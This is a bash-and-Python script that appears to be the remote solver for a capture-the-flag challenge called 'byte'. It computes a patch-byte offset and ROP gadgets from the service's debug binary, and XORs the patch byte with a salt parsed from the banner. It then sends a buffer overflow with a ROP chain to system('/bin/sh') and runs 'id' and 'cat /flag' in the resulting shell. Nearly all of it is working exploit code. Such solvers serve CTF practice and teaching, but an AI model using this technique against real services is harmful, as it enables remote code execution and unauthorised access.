#!/usr/bin/env bash
# Remote solver: drives the byte-challenge service over TCP.
#
#   ./solve/solve-remote.sh <host> <port>
#
# Computes the patch byte file offset and ROP gadgets/addresses from
# the local byte.dbg, opens a TCP connection, parses the per-session
# salt out of the wrapper banner, XORs the desired patch byte against
# it, and submits the result. Then sends the BOF + ROP chain followed
# by `id; cat /flag` to the spawned shell.

set -euo pipefail

host=${1:?usage: $0 <host> <port>}
port=${2:?usage: $0 <host> <port>}

cd "$(dirname "$0")/../service"

dbg=byte.dbg
bin=byte
if [[ ! -f $dbg || src/echo.c -nt $dbg ]]; then
    make -C src
    cp src/$bin $bin
    cp src/$dbg $dbg
fi

python3 - "$host" "$port" <<'PY'
import re, socket, struct, subprocess, sys, time
from elftools.elf.elffile import ELFFile

host, port = sys.argv[1], int(sys.argv[2])
p = lambda x: struct.pack("<Q", x)

# --- compute everything we need from byte.dbg locally ----------------
text_vaddr = text_foff = None
syms = {}
binsh_vaddr = None
with open("byte.dbg", "rb") as f:
    elf = ELFFile(f)
    for sec in elf.iter_sections():
        if sec.name == ".text":
            text_vaddr = sec["sh_addr"]
            text_foff  = sec["sh_offset"]
        if sec.name == ".symtab":
            for s in sec.iter_symbols():
                if s.name in ("main", "system", "__libc_system"):
                    syms[s.name] = s["st_value"]
        if sec.name == ".rodata":
            ro_vaddr, ro_foff, ro_size = sec["sh_addr"], sec["sh_offset"], sec["sh_size"]
            f.seek(ro_foff)
            data = f.read(ro_size)
            i = data.find(b"/bin/sh\x00")
            if i >= 0:
                binsh_vaddr = ro_vaddr + i

system_vaddr = syms.get("system") or syms["__libc_system"]

dis = subprocess.check_output(
    ["objdump", "-d", "--disassemble=main", "-M", "intel", "byte.dbg"]
).decode()
m = re.search(r"^\s*([0-9a-f]+):\s*ba 40 00 00 00\s*mov\s+edx,0x40", dis, re.M)
assert m, "couldn't find `mov edx, 0x40` in main"
patch_foff = int(m.group(1), 16) + 1 - text_vaddr + text_foff

with open("byte.dbg", "rb") as f:
    full = f.read()
gadget_off = full.find(b"\x5f\x5d\xc3", text_foff, text_foff + 0x80000)
assert gadget_off > 0, "no pop rdi; pop rbp; ret gadget"
gadget_vaddr = gadget_off - text_foff + text_vaddr

print(f"[*] main         = 0x{syms['main']:x}",       file=sys.stderr)
print(f"[*] system       = 0x{system_vaddr:x}",       file=sys.stderr)
print(f"[*] /bin/sh      = 0x{binsh_vaddr:x}",        file=sys.stderr)
print(f"[*] pop rdi/rbp  = 0x{gadget_vaddr:x}",       file=sys.stderr)
print(f"[*] patch foff   = {patch_foff} (0x{patch_foff:x})", file=sys.stderr)

# --- ROP payload (120 bytes, == patch byte 0x78 so read consumes it
#     exactly and our shell commands stay in the pipe) ----------------
rop  = b"A" * 88
rop += p(gadget_vaddr) + p(binsh_vaddr) + p(0) + p(system_vaddr)
assert len(rop) == 120
WANT_BYTE = 0x78
shell_cmds = b"id\ncat /flag 2>/dev/null || cat /tmp/flag\nexit\n"

# --- talk to the service --------------------------------------------
print(f"[*] connecting to {host}:{port} ...", file=sys.stderr)
s = socket.create_connection((host, port), timeout=10)
s.settimeout(5)
buf = b""

def recv_until(token):
    global buf
    while token not in buf:
        chunk = s.recv(4096)
        if not chunk:
            sys.exit(f"connection closed waiting for {token!r}; buf={buf!r}")
        buf += chunk

def send(data):
    s.sendall(data)
    time.sleep(0.05)

# 1) Wrapper prompts "shall you flip a byte? [y/N]" — say yes.
recv_until(b"[y/N]")
send(b"y\n")

# 2) Wrapper prints "  the byte's salt for this rite: <2 hex>".
recv_until(b"salt for this rite:")
recv_until(b"\n")
m = re.search(rb"salt for this rite:\s*([0-9a-fA-F]{2})", buf)
if not m:
    sys.exit(f"no salt found in stream: {buf!r}")
salt = int(m.group(1), 16)
encoded = WANT_BYTE ^ salt
print(f"[*] salt    = 0x{salt:02x}",       file=sys.stderr)
print(f"[*] want    = 0x{WANT_BYTE:02x}",  file=sys.stderr)
print(f"[*] encoded = 0x{encoded:02x}  (= want XOR salt)", file=sys.stderr)

# 3) Submit offset, then encoded byte.
recv_until(b"byte fall?")
send(str(patch_foff).encode() + b"\n")
recv_until(b"replace it?")
send(f"{encoded:02x}".encode() + b"\n")

# 4) Send the ROP payload + shell commands.
send(rop + shell_cmds)

# 5) Drain everything until socket closes or times out.
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        buf += chunk
except (TimeoutError, socket.timeout):
    pass

print("--- transcript ---", file=sys.stderr)
sys.stdout.flush()
sys.stdout.buffer.write(buf)
s.close()
PY
